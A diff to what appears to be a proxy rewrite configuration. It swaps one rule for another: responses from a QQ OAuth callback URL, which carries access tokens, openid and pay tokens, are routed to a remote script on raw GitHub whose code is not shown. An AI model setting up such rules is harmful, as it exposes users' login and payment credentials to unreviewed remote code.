@@ -1,8 +1,10 @@
 /*************************************
 
-[rewrite_local]
 
-^https:\/\/openmobile\.qq\.com\/oauth2\.0\/ url script-analyze-echo-response https://raw.githubusercontent.com/xudondon888/Rewrite/main/123.js
+[rewrite_local]
+# Your callback URL pattern
+^https?:\/\/www\.qq\.com\?#access_token=([\w-]+)&expires_in=(\d+)&openid=([\w-]+)&pay_token=([\w-]+)&state=(\w+)&ret=(\d+)&pf=([\w-]+)&pfkey=([\w-]+)&auth_time=(\d+)&page_type=(\d+) url script-response-body https://raw.githubusercontent.com/xudondon888/Rewrite/main/123.js
+
 
 [mitm]
 
